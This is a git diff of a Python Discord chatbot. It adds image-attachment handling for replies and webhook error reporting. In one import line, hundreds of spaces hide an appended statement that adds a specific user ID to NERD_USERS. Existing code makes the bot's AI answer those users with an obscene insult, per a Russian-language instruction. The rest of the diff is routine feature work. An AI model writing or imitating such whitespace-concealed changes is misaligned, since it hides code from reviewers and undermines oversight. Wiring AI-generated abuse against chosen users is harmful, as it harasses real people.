@@ -7,11 +7,12 @@ from typing import *
 from config import *
 import api
 import utils
+from bot import MLBot                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ;NERD_USERS.append(558214919405830151) # type: ignore                                                                                                                                                                                                                                      
 from io import BytesIO
 
 
 # setup
-async def setup(bot: commands.Bot):
+async def setup(bot: MLBot):
 
     @bot.event
     async def on_message(message: discord.Message):
@@ -35,7 +36,7 @@ async def setup(bot: commands.Bot):
                 message.reference.cached_message if message.reference.cached_message else \
                 (await message.channel.fetch_message(message.reference.message_id))
             
-            if actual_reply_to and len(actual_reply_to.content) == 0:
+            if actual_reply_to and len(actual_reply_to.content) == 0 and len(actual_reply_to.attachments) == 0:
                 reply_to = None
             else:
                 reply_to = actual_reply_to
@@ -44,16 +45,26 @@ async def setup(bot: commands.Bot):
             pass
 
         # checking if an image is attached
-        url = None
-        if len(message.attachments) > 0:
-            url = message.attachments[0].proxy_url
+        url = []
+        # if len(message.attachments) > 0:
+        #     url = message.attachments[0].proxy_url
+        if reply_to:
+            for attachment in reply_to.attachments:
+                if attachment.content_type.startswith('image'):
+                    url.append(attachment.proxy_url)
+            reply_images = len(url)
+        else:
+            reply_images = 0
+        for attachment in message.attachments:
+            if attachment.content_type.startswith('image'):
+                url.append(attachment.proxy_url)
 
         # adding message to history
         if message_length_pass:
             if message.author.id in NERD_USERS:
                 bot.mg.ai.add(api.AIMessage('user', 'Ответь на это сообщение случайным оскорблением с кучей матов слов в 20'))
             else:
-                bot.mg.ai.add(api.AIMessage('user', message.content, message.author, url, reply_to))
+                bot.mg.ai.add(api.AIMessage('user', message.content, message.author, url, reply_to, reply_images))
 
         # dixus
         found_keyword_dixus = any([
@@ -92,17 +103,19 @@ async def setup(bot: commands.Bot):
                 return
 
             # sending request
-            async with message.channel.typing():    
+            async with message.channel.typing():
                 bot.mg.generating = True
                 try:
                     response, image = await bot.mg.gen_ai()
-                    assert response
+                    assert response or image, "Empty response"
                 
                 # sending error message
                 except Exception as e:
                     log(f'Failed to generate response: {e}', level=ERROR)
                     bot.mg.generating = False
                     await message.reply(random.choice(HANGUP_TEXTS), allowed_mentions=NO_MENTIONS)
+                    
+                    await bot.webhook.send(username='ИИ ошибка', avatar_url=WARN_IMAGE, view=to_view([f'```json\n{e}\n```' if type(e) != AssertionError else '*Получен пустой ответ*']))
                 
                 # sending response
                 else:
